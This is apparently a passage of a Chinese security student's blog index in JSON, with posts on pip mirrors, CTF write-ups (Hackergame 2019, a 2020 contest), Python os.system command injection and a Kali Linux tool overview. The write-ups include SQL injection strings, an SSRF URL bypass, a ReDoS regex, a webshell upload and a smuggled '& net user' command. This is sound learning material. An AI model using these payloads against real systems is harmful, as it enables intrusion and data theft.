。\n\n下载后对其进行解压，解压后进入setup.py所在的文件夹。\n\n在文件夹下打开powershell或cmd，只需按住shift键，同时单击鼠标右键，在选项里单击在此处打开Powershell窗口。\n\n输入python setup.py install命令进行安装。这里有一点是要设置好环境变量，特别是在同时安装了Python2和Python3两个版本的情况下。\npip使用等待安装完毕之后，找到python相应版本安装的位置，进入到Scripts目录，在此目录下打开Powershell。\n之后就就可以使用pip install 第三方库名即可安装。但是很多人应该都知道这个国外的下载源特别不靠谱，由于一些原因，这个下载速度过于感人，大概率无法使用。所以建议更换为国内源使用，有两种方式使用。\n第一种使用 pip install 第三方库名 -i https://pypi.tuna.tsinghua.edu.cn/simple, 也就是可以在使用pip的时候在后面加上-i参数，指定pip源。但是这种是临时的用法，每一次使用都必须要这样做。\n第二种就是永久修改了，在Windows环境下可以直接在自己的用户目录下创建一个pip目录，新建一个pip.ini的文件，在里面配置：\n[global]\nindex-url&#x3D;https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;\n\n保存即可了。也可以通过在powershell或cmd里输入pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/\n下面是常见的几个国内pip源（我自己使用的是清华大学的源）：阿里云 https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;\n中国科技大学 https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;\n豆瓣(douban) http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;\n清华大学 https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;\n中国科学技术大学 http:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple\n\n之前不知道就一直用官方的国外源，可是一直都下载很慢或者下载失败。真是坑了我。初学者还是要多向他人请教比较好，或者经常去一些IT网站上学习一下。\n注：pip是一个现代的，通用的 Python 包管理工具。提供了对 Python 包的查找、下载、安装、卸载的功能。\n","slug":"Python之pip使用","date":"2020-03-09T07:38:05.000Z","categories_index":"资源教程","tags_index":"Python","author_index":"A1andNS"},{"id":"9dd1d2d0ce0a5405e3a49858d2b61335","title":"hackergame 2019 WP（只是一些我会的）","content":"hackergame 2019签到题首先打开网页看到叫我提交token，发现提交button是不可用的，所以查看前端代码，修改button模块的属性把disable改为able然后输入token即可得到flag： flag{Welcome_to_Hackergame_2019_ef71c55f9a} \n\n白与夜打开网页得到一段对话和图片，根据提示flag就在图片里，所以就是图片隐写题目，把图片保存到本地，结合“人家明明是白猫”使用stegsolve打开，通过通道分离，得到一个flag：flag{4_B14CK_C4T}\n\n信息安全2077打开后居然是一个倒计时，题目很明确要我去读flag.txt文件，我一开始想要直接访问flag.txt可惜没有成功，所以我用burpsuit抓了个包，发现有个定义时间的文件头，既然时间没到就把它改到了吧，我直接对文件头进行更改，把2019年改为了2077年，重发，得到了flag：flag{Welc0me_to_competit1on_in_2077}\n\n宇宙终极问题问题是x^3+y^2+z^3=42\n所以我们需要构造一个合理的x、y、z\n实在是构造不了，所以Google了一下\n 三立方数之和的维基百科里有这样的内容\n\n输入x、y、z的值，得到flag：\nx:-80538738812075974\ny:80435758145817515\nz:12602123297335631\nflag{W0W_you_kn0w_the_Answer_t0_l1f3_Un1v3r5e_&amp;_Everyth1ng_e4209f4543}\n接下来有好多未知数了，random prime(2^256)生成2-256之间的伪随机数。后面我就真的不会了。。。。。\n网页读取器打开网站根据提示，我尝试了一下输入url，他告知我不在白名单，果然是开不了，下载他的源码文件查看。\n发现白名单和一些要求：\n\n例如：http://开头，主机名必须为example.com or www.example.com\n接着往下看\n\n我们得知他会在最后一位不是/和最后一位不是:时，把@后的内容当作hostname，加上我们知道了whitelist是&quot;example.com&quot;和 &quot;www.example.com&quot;\n所以我们可以构造一个@example.com的payload\n加上题目上有有提示我们答案在http://web/flag里所以构造\nhttp://web/flag@example.com\n提交后主机名没有问题，状态404\n所以注释后文既http://web/flag#@example.com\n提交得到flag： flag{UrL_1S_n0t_SO_easy} \n\nHappy LUG这题让我实在是摸不着头脑\n正则验证器下载源文件，进行代码分析，见我做的注释：\n\n接下来有一个re.compile()函数，将一个字符串编译成 pattern object，用于匹配或搜索。\n用r的规则去s中做匹配，成功就输出匹配成功（英语），失败就是匹配失败了\n\n还有是使用signal.signal()函数来预设(register)信号处理函数，\n只要SIGALRM信号出现，就执行flag函数\n\n看到signal.alarm(30)应该是要我构造一个需要执行很多次，非常耗费时间的payload。\nRegEx: (a+)+p \n-womGgjr1-1582644025893)]\n看到signal.alarm(30)应该是要我构造一个需要执行很多次，非常耗费时间的payload。\nRegEx: (a+)+p \nString:aaaaaaaaaaaaaaaaaaaaaaax\n","slug":"hackergame-2019-WP（只是一些我会的）","date":"2020-03-09T07:34:20.000Z","categories_index":"CTF","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"6c5dc7f89d0e5d8d84f40d382a537c6b","title":"2020年新春战疫网络安全公益赛解题记录","content":"圆满落幕的比赛，可惜我就会2题web，我有点不太行啊。\n简单的招聘系统在用户登录界面存在万能密码绕过漏洞，存在SQL注入漏洞。经过检验是字符型漏洞。\n我还发现新注册用户会覆盖原来的用户，使用万能密码绕过时，默认登录最新注册的用户。\n注册新用户后，发现不是第一用户，而是第二个。说明原来就有一个。Blank Page需要是admin登录才可以看见，新注册用户权限不够。    \n所以我重新下发了环境，一开始就用万能密码登录。绕过后发现第一个用户就是admin。那么就我就去访问了Blank Page。\n打开Blank Page\n\n提示是搜索key值，把admin的Key值用来一试。可以查到招聘者的信息。并且发现搜索框存在SQL注入漏洞，是字符型。\n于是我一开始就使用了手工注入去做。\n‘oder by 5#通过进一步检测，column是5 \nunion select 1,2,3,4,5#发现第二列为full name的显示列。也只能显示一列。\n可以用于相关信息的显示。查询可知数据库版本为MySQL 5.5.61-0ubuntu0.14.04.1\n得知table_name:是user\n然后查询列，爆出来很多的列明\nHost,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routin\n然后爆出Password\n\n\n7fef6171469e80d32c0559f88b377245\n这是一个MD5，解密后是admin888。\n结果我发现自己方向好像错了，这个并没有什么用。。。。。\n后来我只好用SQLMap做一下了，很容易我就找到了flag。\n我觉得可能是手工注入的时候显示时漏了什么吧，一直没有找到flag。\n\n flag{fde80bd4-9f97-4397-b91e-73754f14a4e9}\nezupload这题看起来就是一个webshell的题目，所以我直接上传了一个一句话木马，发现居然不会过滤PHP文件，这就很舒服了。接下来就是连接webshell了，我是使用了中国蚁剑，进入后打开虚拟终端，在根目录下有两个flag相关软件，elf文件在Linux虚拟终端下直接使用命令./filename filename2，就可以解密并且得到flag了。\nflag{b71624e0-4274-42de-ba47-e86caa37ab39}这个时比赛时的默认flag，一开始我环境出了点小问题没有覆盖，就无意间拿到了这个默认flag，当然是不能用的。。。后来拿到的flag忘记记录了，疏忽了。下次一定要记下来！！！\n","slug":"2020年新春战疫网络安全公益赛解题记录","date":"2020-03-09T07:30:43.000Z","categories_index":"CTF","tags_index":"网络安全,新春战疫","author_index":"A1andNS"},{"id":"8bd60d49b3a0e56768342dfdd30f94ad","title":"Python学习之OS库的system()函数","content":"引入今天学到了一个十分好用的函数，那就是system()函数，这是一个包含再OS库中的一个函数，用于系统命令执行，方便确实是方便但是也有安全风险，如果对输入没有做好过滤，就是出现命令执行（命令注入）漏洞，如果是在服务器对外web页面犯了这样的错误，这样就会威胁到服务器安全。    \nsystem()使用实例system(需要执行的cmd命令)，这个是system函数的用法。下面通过一个实例来说明：\nimport os\nlibs = &#123;\"numpy\",\"matplotlib\",\"pillow\",\"sklearn\",\"requests\",\"jieba\",\"beautifulsoup4\",\"wheel\",\"networkx\",\"sympy\",\"pyinstaller\",\"django\",\"flask\",\"werbot\",\"pyQt5\",\"pandas\",\"pyopengl\",\"pypdf2\",\"docopt\",\"pygame\"&#125;\ntry:\n    for lib in libs:\n        os.system(\"pip install \"+lib)\n    print(\"Successful\")\nexcept:\n    print(\"Failed Somehow\")\n这个实例用于命令批量安装python第三方库，大大提升了安装效率，自动化安装，避免了多次命令输入，重复低效。运行结果如下，真的是太爽了。\nPython使用不当的后果import os\npost = input(\"请输入一个IP：\")\nos.system(\"ping \" + post)\n就这样短短的3行演示一下吧。什么过滤都不做直接来。我输入www.baidu.com，他就执行了ping www.baidu.com的命令。当我输入的是`127.0.0.1 &amp; net user时，可以看到它不仅执行了ping命令还执行了net user命令，这就是一个命令注入漏洞了。我还可以使用别的命令让他去执行。\n总结这是一个十分好用的函数，可以很大程度帮助我们提高命令执行的效率，特别是要进行一些重复性的命令执行时，但是当它再服务器上对外接收输入，又未经过滤时就会时一个定时炸弹，留下了一个命令执行的漏洞，黑客完全可以通过构造命令来对服务器进行命令注入攻击，然后利用一些命令来实现远程控制或者远程操控。\n","slug":"Python学习之OS库的system-函数","date":"2020-03-09T07:25:27.000Z","categories_index":"Python学习","tags_index":"网络安全,Python","author_index":"A1andNS"},{"id":"13f1a55b077e2033b888c3bc8d5dc16c","title":"kali Linux简易手册","content":"Kali想必很多学网安的朋友都会安装，它也是深受安全工作者喜爱。下面就为大家带来Kali Linux的简要手册，希望可以帮助大家了解和入门Kali Linux，我也可以同过本文来复习Kali。本文可能有所不足，还请大家批评指正。\nKali Linux基本介绍Kali Linux是基于Debian的Linux发行版，设计用于数字鉴识和渗透测试，由Offensive Security Ltd维护和资助，最先是通过重写BackTrack来完成的。\nKali Linux是一个用来高级渗透测试和安全审计的Linux版本，集成了大量的相关工具，可以供渗透测试和安全设计人员使用。重点是Kali Linux声明永久免费，并且拥有开源的git树。\nKali Linux的安装Kali Linux可以安装到许多不同的开发平台上，也可以支持ARM平台，并且设计了ARMEL和ARMHF系统。但是，ARM平台运行Kali的流畅度肯定是不如X86架构了。一般安装就一下这几种方式：\n首先附上系统下载地址：https://www.kali.org/downloads/\n1、安装到硬盘，也就是安装到物理机。但在安装前必须先对系统运行需要的基本硬件需求进行确认，不然就没法保证系统的运行速度了。最好要按照最新的系统安装要求来确认。对了在引导界面建议大家使用图形化安装，毕竟我们可能还是图形化界面比较熟悉。步骤就\n2、安装到虚拟机，你可以安装到目前主流的桌面虚拟计算机软件上，如VMware Workstation和Virtual Box，这里就不叙述安装流程了，在CSDN上有很多的安装教程，大家可以自行选择。其实只要大家环境配置好，虚拟机的配置设置合理，其他就是系统安装的流程了。\n3、安装到树莓派，树莓派是一款只有信用卡大小的微型电脑，它是基于ARM的微型电脑主板。一般情况我们不会去搞这东西。。。所以这里就不作过多叙述。\n4、安装到U盘，一般使用win32diskimager软件刻录iso文件进U盘，在开机时选择live系统开启即可。\nKali Linux配置源的配置Kali源指的就是Kali Linux的系统更新服务器，相当于软件仓库和源码仓库，或者你就认为它是一个手机的应用商店。目前源有两种：普通Kali源和Rolling源，相比普通源，Rolling源内的工具更多，版本也会更高，更适应用户需求。\n配置源安装好的Kali系统会设置一个默认的官方Kali.org源，但由于这个源在美国，国内更新的时候比较慢，所以建议替换成国内的镜像源。\n更新软件源的时候，编辑/ect/apt/sources.list\n注释里面的kali官方更新源，然后使用国内源替代，如下图\n\n保存后通过一下的命令就可以对自己的Kali Linux源进行相应的更新了\napt-get dist-upgrade@安装更新\napt-get update#刷新系统\napt-get dis-upgrade#更新系统版本\n以下给出一些我在用的更新源：\n#中科大更新源\ndeb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib\ndeb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib\n#阿里云更新源\ndeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib\ndeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib\n#清华更新源\ndeb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free\ndeb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free\n#Kali官方Rolling源\ndeb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main contrib non-free#官方源\n\n更新源大家也可以自行上网查找\nAPT安装软件APT软件包处理工具是一个轻量级但是功能十分强大的命令行工具，用于安装和删除软件包，通常写为apt-get。\napt-get #软件安装卸载\n\napt-get install name#安装name软件\n\n如安装fcitx软件的命令行：\n打开终端，输入apt-get install fcitx即可\n软件包的名称需要大家自行上网查询。\nDebian软件包管理器Kali Linux系统是基于Debian的操作系统，可以通过使用debian软件包管理器的软件包文件来安装。\n那么需要自行去网络上下载相应的软件的.deb格式的软件包，然后使用dpkg命令安装这个软件\ndpkg-i package_file.deb#安装软件，package_file为你下载的.deb文件的文件名\n\ndpkg-l package_file.deb#检查已经安装软件包命令格式,package_file为你安装的软件的软件名\n\nTAR源码包安装有的第三方或者开源项目经常会将源码压缩来提供下载，因此，下载下来的一般为源码压缩包，一般以.tar或者.tar.gz为拓展名，此时就需要使用tar命令来进行解压。\n例如我下载了一个名为name.tar.gz的压缩包，将会有一下操作\n$ tar -xzvf name.tar.gz#用tar解压文件\n$ cd name#进入解压目录\n$ .&#x2F;configure#为编译做准备，生成makefile\n$ make#对源码进行软件编译\n$ make install#进行软件安装\n#至此结束，但是如果在编译时出现错误，就需要用户自己去排除错误，所以挺麻烦的\n\nkali Linux常用软件安装下面带给大家kali Linux环境下常用的软件安装，我觉得主要就是中文输入法吧，其他看自己需求安装。\n#安装谷歌拼音输入法，kali自己是没有中文输入法的。。。。。\n#一下命令均在终端中实现\napt-get install fcitx-googlepinyin\n#在问你是否继续是回复Y，即可完成安装\n#完成后去设置里，将输入源改为汉语，使用ctrl+空格就可以切换到谷歌输入法了\n\n配置中文化有些朋友安装Kali后是English界面，那就 需要进行中文化配置了。\n（1）打开系统设置\n（2）修改区域于语言为汉语（中国）\n（3）系统更新执行一下命令，即可中文化\napt-get update&amp;&amp;apt-get upgrade\nkali linux的工具集信息收集NmapNmap是一个免费开放的网络扫描和嗅探工具包，也被称为网络映射器。它使用TCP/IP协议扫描网上电脑开放的网络连接端，确定哪些服务端口在运行，并且通过TCP/IP协议栈指纹判断计算机运行什么操作系统。\n它有三个基本的功能，一是探测一组主机是否在线，二是扫描主机端口，三是推断主机操作系统。它可以被用于扫描只有两个节点的LAN,甚至500个节点以上的网络。\nRecon-NG框架Recon-NG框架是使用Python编写的一个开源Web侦查信息收集框架。它支持大量的模块，可以通过调用模块来达到自动收集信息和网络侦查目的。\n它可以对输入的域名进行枚举，查找其device所有子域名和搜集关于这个网站的信息 \n扫描类NessusNessus号称世界上最流行和漏洞扫描工具， 总共有超过75,000个机构使用Nessus 作为扫描该机构电脑系统的软件。  采用客户/服务器体系结构，客户端提供了运行在X window 下的图形界面，接受用户的命令与服务器通信，传送用户的扫描请求给服务器端，由服务器启动扫描并将扫描结果呈现给用户；扫描代码与漏洞数据相互独立，Nessus 针对每一个漏洞有一个对应的插件，漏洞插件是用NASL(NESSUS Attack Scripting Language)编写的一小段模拟攻击漏洞的代码，这种利用漏洞插件的扫描技术极大的方便了漏洞数据的维护、更新；Nessus 具有扫描任意端口任意服务的能力；以用户指定的格式（ASCII 文本、html 等）产生详细的输出报告，包括目标的脆弱点、怎样修补漏洞以防止黑客入侵及危险级别。 \nBurpSuitBurp Suite 是一个用于测试 Web 应用程序安全性的图形化工具。该工具使用Java编写，由PortSwigger Web Security开发。 这款工具大家应该很熟悉也经常使用，在Kalli Linux里内置了这款web攻击工具，通过设置代理，你可以使用它抓包，改包，爆破等。可以算得上是经常使用的一款工具，它有社区版和专业版，在进行爆破时专业版的好处就体现出来了，专业版可以更改线程而社区版则不支持线程的修改。\n渗透类Subterfuge这是一款使用Python编写的中间人攻击框架，它集成了一个前端和收集了一些著名的可以用于中间人攻击的安全工具。它不仅可以获取登录权限，代码注入，服务器劫持等。成功运行Subterfuge需要Django、Scapy模块，使用前注意安装，安装包的dependencies目录下提供的Subterfuge所需的Python模块。\nMetasploitMetasploit可以算得上是计算机安全业界最知名的框架之一，它是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞发起攻击。它本身就附带了数百个已知的软件漏洞的专业漏洞攻击工具。\n它也搭载了大量的渗透工具，可以完成许多渗透操作，如渗透攻击MySQL、PostgreSQL、渗透攻击Tomcat服务、telnet服务，Samba服务和通过PDF文件进行攻击，功能强大，深受喜爱。\n密码类mimikatz这是系统密码破解获取工具，它被很多人称为密码抓取神器。这个工具曾作为一个独立的程序使用，现在已经被集成在Metasploit，这就是为什么说Metasploit的工具NB了。\nHydraHydra是一个强大的暴力密码破解工具。它支持几乎所有的协议，如FTP、HTTP、HTTPS等。但是和其他的破解工具一样，破解能力的关键还是在于字典，只有字典强大才能提高破解的概率。这款软件有图形化界面，且操作简单，很合适新手上手。\n无线网络aircrack-ng这是被广泛使用的一款无线协议破解工具。它是一个于802.11标准的无线网络分析有关的安全软件，可以在Windows和LInux上运行，主要有两种攻击方式进行web破解，一是FMS攻击，二是Korek攻击。后者基于统计学，攻击效率相比前者有所提升。主要针对无线网络攻击，在无线局域网络中可以大展身手。\nGerix Wifi Cracker它也是一款无线安全工具，拥有图形化界面，所以会比较易于使用，支持802.11标准，通过抓取数据进行分析，以达到无线攻击的目的。\n取证类WiresharkWireshark是一个网络封包分析工具，学网络的朋友应该都很熟悉，抓包必备工具，大家大都学过对于分析数据包真的是神器一个。使用起来也挺友好的吧。\nMaltego这是一款被渗透测试人员和取证分析人员广泛的使用的一款优秀工具，具有很强的情报分析能力，可以选择不同的模式对数据进行分析，并且能够通过安装更多的API来拓展功能。\n总结Kali Linux是一款非常好的适合安全人员的开源操作系统，其内置了大量的安全工具，对于安全业者而言是一个很好的帮手，对于网络安全/信息安全的初学者而言，也是一个友好的平台，为什么这么说呢？因为它拥有图形化界面，这对于初学者而言是很好的，相比使用命令行，初学者对于图形化界面更有好感。\n再次希望本文可以帮到你，能解答你的一些困惑。\n参考资料[1]baike.baidu.com百度百科\n[2]陈铁明.网络空间安全实战基础:第一版.北京:人民邮电出版社,2018.\n","slug":"kali-Linux简易手册","date":"2020-03-09T04:45:58.000Z","categories_index":"学习笔记","tags_index":"网络安全,Linux","author_index":"A1andNS"}]